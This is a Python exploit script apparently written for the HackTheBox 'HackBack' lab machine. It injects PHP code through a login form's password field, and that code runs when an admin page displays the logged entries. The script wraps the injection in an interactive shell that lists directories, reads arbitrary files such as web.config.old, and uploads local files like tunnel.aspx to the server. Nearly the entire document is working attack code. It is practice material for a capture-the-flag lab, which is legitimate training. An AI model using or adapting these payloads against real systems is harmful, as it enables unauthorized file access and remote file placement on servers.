#!/usr/bin/python3

##This script was created with the purpose of automating the injection process for enumeration and file uploading in the HackBack machine's web service on HacktheBox.

import sys
import requests
import re, base64
from colored import fg, bg, attr

if len(sys.argv) < 2 :
    print("HTB: HackBack")
    print("Basic Usage: python3 {} <PHPSESSID>".format(sys.argv[0]))
    sys.exit(0)

phpsessID = sys.argv[1]

colors = {
    'red': fg('red'),
    'cyan': fg('cyan'),
    'green': fg('green')
}


url_send = 'http://www.hackthebox.htb/'
url_show = 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session={}'.format(phpsessID)
url_init = 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=init&site=hackthebox&password=12345678&session={}'.format(phpsessID)

headers = {
    'Host': 'www.hackthebox.htb',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://www.hackthebox.htb',
    'Connection': 'close',
    'Referer': 'http://www.hackthebox.htb/',
    'Cookie': 'PHPSESSID={}'.format(phpsessID),
    'Upgrade-Insecure-Requests': '1'
    }

data = {
    ### Change the token if necessary
    '_token': '23I6TdlO18ZPtXYQPeHZyAY4Y8Z9wq1ntgvP8YdA',
    'username': 'dddd',
    'password': 'dddd',
    'submit': ''
}


def send_data():
    response_init = requests.get(url_init, allow_redirects=False)
    response_send = requests.post(url_send, headers=headers, data=data)
    response_show = requests.get(url_show, allow_redirects=False)
    response = response_show.content
    result = response.decode()
    result = re.sub(r'\[.*?Password: ', '', result)
    return colors['cyan'] + result + attr('reset')


def directory_list(directory):
    data.update({'password': "<?php echo implode(PHP_EOL, scandir('{}')); ?>".format(directory)})
    dresult = send_data()
    print('\n' , dresult, '\n')

def read_file(file):
    data.update({'password' : "<?php echo file_get_contents('{}'); ?>".format(file)})
    rresult = send_data()
    print('\n', rresult, '\n')

def working_directory():
    data.update({'password' : "<?php echo getcwd(); ?>"})
    wresult = send_data()
    print('\n', wresult, '\n')

def upload_file(file):
    with open(file, 'r') as f:
        contenido = f.read()
        contenido64 = base64.b64encode(contenido.encode('utf-8'))
    
    #print(contenido64.decode())
    data.update({'password' : "<?php file_put_contents('{}', base64_decode('{}')); ?>".format(file, contenido64.decode())})
    uresult = send_data()
    print("\nUpload Sucessfull.....\n")

def main():


    command = input(colors['red'] + "webadmin~> " + attr('reset'))


    while command != "exit" :
        if "ls " in command:
            
            directory = command[3::]
            directory_list(directory)
            command = input(colors['red'] + "webadmin~> " + attr('reset'))
        
        elif "cat " in command:

            file = command[4::]
            read_file(file)
            command = input(colors['red'] + "webadmin~> " + attr('reset'))
   
       
        elif "upload " in command:

            file = command[7::]
            upload_file(file)
            command = input(colors['red'] + "webadmin~> " + attr('reset'))

        elif "pwd" in command:

            working_directory()
            command = input(colors['red'] + "webadmin~> " + attr('reset'))


        else :
            print(colors['green'] + """
help :

    ls <directory> -> List the contents of the directory
        Example: ls .
    
    cat <file> -> Read Files
        Example: cat ../web.config.old
    
    upload <local_file>-> Upload a local file
        Example: upload tunnel.aspx
    
    pwd  -> Print working directory 
    
    exit -> Exit the program
            """)        
            command = input(colors['red'] + "webadmin~> " + attr('reset'))


if __name__ == '__main__':
    main()
